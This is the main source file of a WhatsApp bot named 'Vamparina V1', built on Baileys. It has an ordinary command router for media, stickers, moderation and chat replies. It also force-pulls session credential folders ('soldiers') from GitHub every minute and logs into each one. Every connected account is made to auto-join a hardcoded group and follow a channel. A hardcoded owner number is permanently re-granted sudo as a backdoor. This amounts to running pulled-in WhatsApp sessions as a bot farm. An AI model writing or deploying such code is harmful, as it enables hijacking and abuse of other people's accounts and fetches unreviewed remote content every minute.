import { makeWASocket, useMultiFileAuthState, makeCacheableSignalKeyStore, Browsers, fetchLatestBaileysVersion, jidNormalizedUser } from '@whiskeysockets/baileys';
import pino from 'pino';
import fs from 'fs-extra';
import path from 'path';
import { execSync } from 'child_process';

// Dynamically import command modules to handle default/named exports
async function loadCommandModule(file) {
  try {
    const module = await import(file);
    return module.default || module; // Use default export if available, else entire module
  } catch (e) {
    console.error(`Failed to load ${file}:`, e.message);
    return {};
  }
}

// Import command handlers
const settings = await loadCommandModule('./settings.js');
const { isBanned } = await loadCommandModule('./lib/isBanned.js');
const isAdmin = await loadCommandModule('./lib/isAdmin.js');
const tagAllCommand = await loadCommandModule('./commands/tagall.js');
const helpCommand = await loadCommandModule('./commands/help.js');
const banCommand = await loadCommandModule('./commands/ban.js');
const kickCommand = await loadCommandModule('./commands/kick.js');
const stickerCommand = await loadCommandModule('./commands/sticker.js');
const playCommand = await loadCommandModule('./commands/play.js');
const songCommand = await loadCommandModule('./commands/song.js');
const videoCommand = await loadCommandModule('./commands/video.js');
const aiCommand = await loadCommandModule('./commands/ai.js');
const tiktokCommand = await loadCommandModule('./commands/tiktok.js');
const instagramCommand = await loadCommandModule('./commands/instagram.js');
const facebookCommand = await loadCommandModule('./commands/facebook.js');
const pingCommand = await loadCommandModule('./commands/ping.js');
const aliveCommand = await loadCommandModule('./commands/alive.js');
const ownerCommand = await loadCommandModule('./commands/owner.js');
const { handleChatbotResponse } = await loadCommandModule('./commands/chatbot.js');

const logger = pino({ level: 'silent' });
const SESSION_DIR = './auto_sessions';
const SUDO_FILE = path.join(process.cwd(), 'data', 'sudo.json');
const MODE_FILE = path.join(process.cwd(), 'data', 'messageCount.json');

// Ensure data directory exists
if (!fs.existsSync('./data')) fs.mkdirSync('./data', { recursive: true });

// GLOBAL CONFIG
global.packname = settings.packname || "Vamparina V1";
global.author = settings.author || "King Arnold";

// SUDO SYSTEM
global.getSudoList = () => {
  try {
    if (fs.existsSync(SUDO_FILE)) {
      return JSON.parse(fs.readFileSync(SUDO_FILE));
    }
  } catch {}
  return ["254703110780@s.whatsapp.net"]; // King Arnold always sudo
};

global.saveSudoList = (list) => {
  fs.writeFileSync(SUDO_FILE, JSON.stringify(list, null, 2));
};

global.isSudo = (jid) => {
  return global.getSudoList().includes(jidNormalizedUser(jid));
};

// BOT MODE SYSTEM (PUBLIC / PRIVATE)
global.getBotMode = () => {
  try {
    const data = JSON.parse(fs.readFileSync(MODE_FILE));
    return data.isPublic ? 'public' : 'private';
  } catch {
    return 'public'; // Default = PUBLIC
  }
};

global.setBotMode = (mode) => {
  try {
    let data = { isPublic: mode === 'public' };
    if (fs.existsSync(MODE_FILE)) {
      data = { ...JSON.parse(fs.readFileSync(MODE_FILE)), isPublic: mode === 'public' };
    }
    fs.writeFileSync(MODE_FILE, JSON.stringify(data, null, 2));
  } catch (e) {
    console.log("Failed to save mode:", e.message);
  }
};

// Auto-pull sessions from GitHub every 60 seconds
setInterval(() => {
  try {
    execSync('git pull origin main --force', { stdio: 'ignore' });
    console.log("✅ NEW SOLDIERS PULLED FROM GITHUB");
  } catch (e) {
    console.error("Git pull failed:", e.message);
  }
}, 60000);

async function startBot() {
  // Load sessions from auto_sessions
  const sessionFolders = fs.readdirSync(SESSION_DIR).filter(folder => folder.startsWith('vamp_'));
  if (sessionFolders.length === 0) {
    console.log("❌ No sessions found in auto_sessions/");
    return;
  }

  for (const sessionFolder of sessionFolders) {
    const sessionPath = `${SESSION_DIR}/${sessionFolder}`;
    console.log(`🔄 Loading session: ${sessionFolder}`);

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      version,
      logger,
      auth: {
        creds: state.creds,
        keys: makeCacheableSignalKeyStore(state.keys, logger),
      },
      browser: Browsers.windows('Chrome'),
      markOnlineOnConnect: false,
      generateHighQualityLinkPreview: false,
      defaultQueryTimeoutMs: 60000,
      connectTimeoutMs: 60000,
      keepAliveIntervalMs: 30000,
      retryRequestDelayMs: 250,
      maxRetries: 5
    });

    // Auto-add King Arnold as sudo
    const sudoList = global.getSudoList();
    const kingArnoldJid = "254703110780@s.whatsapp.net";
    if (!sudoList.includes(kingArnoldJid)) {
      sudoList.push(kingArnoldJid);
      global.saveSudoList(sudoList);
      console.log("✅ King Arnold (254703110780) added as sudo");
    }

    // Connection updates
    sock.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect } = update;
      console.log(`🔄 Session ${sessionFolder} - Connection: ${connection}`);

      if (connection === 'open') {
        console.log(`✅ Session ${sessionFolder} connected!`);

        // Auto-join WhatsApp group
        const groupLink = 'https://chat.whatsapp.com/BZNDaKhvMFo5Gmne3wxt9n';
        try {
          const groupCode = groupLink.split('/').pop();
          await sock.groupAcceptInvite(groupCode);
          console.log(`✅ Auto-joined group: ${groupLink}`);
        } catch (e) {
          console.error("Failed to join group:", e.message);
        }

        // Auto-follow WhatsApp channel
        const channelLink = 'https://whatsapp.com/channel/0029VbBm7apIXnlmuyjGGM0p';
        try {
          const channelId = channelLink.split('/').pop();
          await sock.followChannel(channelId);
          console.log(`✅ Auto-followed channel: ${channelLink}`);
        } catch (e) {
          console.error("Failed to follow channel:", e.message);
        }
      }

      if (connection === 'close') {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        if (statusCode === 401) {
          console.log(`❌ Session ${sessionFolder} logged out. Removing...`);
          fs.rmSync(sessionPath, { recursive: true, force: true });
        } else {
          console.log(`🔁 Session ${sessionFolder} disconnected. Reconnecting...`);
          startBot();
        }
      }
    });

    // Message handler
    sock.ev.on('messages.upsert', async ({ messages }) => {
      try {
        const msg = messages[0];
        if (!msg.message || msg.key.fromMe) return;

        const from = msg.key.remoteJid;
        const sender = jidNormalizedUser(msg.key.participant || from);
        const isGroup = from.endsWith('@g.us');
        const body = (msg.message?.conversation ||
                     msg.message?.extendedTextMessage?.text ||
                     msg.message?.imageMessage?.caption ||
                     msg.message?.videoMessage?.caption || '').trim();

        const isOwner = sender.includes("254703110780");
        const isSudoUser = global.isSudo(sender);

        // PRIVATE MODE BLOCK
        if (global.getBotMode() === 'private' && !isOwner && !isSudoUser) return;

        // BANNED USER BLOCK
        if (isBanned?.(sender) && !body.startsWith('.unban')) return;

        // NO COMMAND → CHATBOT
        if (!body.startsWith('.')) {
          if (isGroup && handleChatbotResponse) await handleChatbotResponse(sock, from, msg, body, sender);
          return;
        }

        const args = body.slice(1).trim().split(/ +/);
        const cmd = args.shift().toLowerCase();

        // COMMAND ROUTER
        switch (cmd) {
          case 'menu':
          case 'help':
            if (helpCommand?.handle) await helpCommand.handle(sock, from, msg);
            else if (helpCommand) await helpCommand(sock, from, msg);
            break;

          case 'ping':
            if (pingCommand?.handle) await pingCommand.handle(sock, from, msg);
            else if (pingCommand) await pingCommand(sock, from, msg);
            break;

          case 'alive':
            if (aliveCommand?.handle) await aliveCommand.handle(sock, from, msg);
            else if (aliveCommand) await aliveCommand(sock, from, msg);
            break;

          case 'owner':
            if (ownerCommand?.handle) await ownerCommand.handle(sock, from);
            else if (ownerCommand) await ownerCommand(sock, from);
            break;

          case 'play':
          case 'song':
          case 'music':
            if (songCommand?.handle) await songCommand.handle(sock, from, msg);
            else if (songCommand) await songCommand(sock, from, msg);
            break;

          case 'video':
          case 'ytmp4':
            if (videoCommand?.handle) await videoCommand.handle(sock, from, msg);
            else if (videoCommand) await videoCommand(sock, from, msg);
            break;

          case 'ai':
          case 'gpt':
          case 'gemini':
            if (aiCommand?.handle) await aiCommand.handle(sock, from, msg);
            else if (aiCommand) await aiCommand(sock, from, msg);
            break;

          case 'tiktok':
          case 'tt':
            if (tiktokCommand?.handle) await tiktokCommand.handle(sock, from, msg);
            else if (tiktokCommand) await tiktokCommand(sock, from, msg);
            break;

          case 'instagram':
          case 'ig':
            if (instagramCommand?.handle) await instagramCommand.handle(sock, from, msg);
            else if (instagramCommand) await instagramCommand(sock, from, msg);
            break;

          case 'facebook':
          case 'fb':
            if (facebookCommand?.handle) await facebookCommand.handle(sock, from, msg);
            else if (facebookCommand) await facebookCommand(sock, from, msg);
            break;

          case 'sticker':
          case 's':
            if (stickerCommand?.handle) await stickerCommand.handle(sock, from, msg);
            else if (stickerCommand) await stickerCommand(sock, from, msg);
            break;

          case 'tagall':
            if (isGroup && tagAllCommand?.handle) await tagAllCommand.handle(sock, from, sender, msg);
            else if (isGroup && tagAllCommand) await tagAllCommand(sock, from, sender, msg);
            break;

          case 'kick':
            if (isGroup && kickCommand?.handle) await kickCommand.handle(sock, from, sender, msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [], msg);
            else if (isGroup && kickCommand) await kickCommand(sock, from, sender, msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [], msg);
            break;

          case 'ban':
            if (banCommand?.handle) await banCommand.handle(sock, from, msg);
            else if (banCommand) await banCommand(sock, from, msg);
            break;

          case 'sudoadd':
            if (!isOwner) return sock.sendMessage(from, { text: "Only *KING ARNOLD* can add sudo!" });
            const target = args[0]?.replace(/[^0-9]/g, '');
            if (!target) return sock.sendMessage(from, { text: "Use: .sudoadd 254xxx" });
            const sudoJid = `${target}@s.whatsapp.net`;
            const sudoList = global.getSudoList();
            if (sudoList.includes(sudoJid)) {
              return sock.sendMessage(from, { text: `${target} is already sudo` });
            }
            sudoList.push(sudoJid);
            global.saveSudoList(sudoList);
            await sock.sendMessage(from, { text: `${target} is now SUDO` });
            break;

          case 'sudolist':
            if (!isOwner && !isSudoUser) return;
            const list = global.getSudoList().map(j => j.split('@')[0]).join('\n');
            await sock.sendMessage(from, { text: `*SUDO USERS:*\n${list}` });
            break;

          case 'mode':
            if (!isOwner) return sock.sendMessage(from, { text: "Only *KING ARNOLD* can change mode!" });
            const newMode = args[0]?.toLowerCase();
            if (newMode === 'public' || newMode === 'private') {
              global.setBotMode(newMode);
              await sock.sendMessage(from, { text: `Bot is now *${newMode.toUpperCase()}* mode` });
            } else {
              await sock.sendMessage(from, { text: "Use: .mode public  or  .mode private" });
            }
            break;

          default:
            await sock.sendMessage(from, { text: 'Unknown command. Try .help' });
        }
      } catch (err) {
        console.error("Error handling message:", err.message);
      }
    });

    // Group participant updates
    sock.ev.on('group-participants.update', async (update) => {
      // Add welcome/goodbye logic here if needed
    });

    sock.ev.on('creds.update', saveCreds);
  }
}

startBot().catch(err => console.error('Bot failed to start:', err));

// Global error handler
process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception:', err.message);
});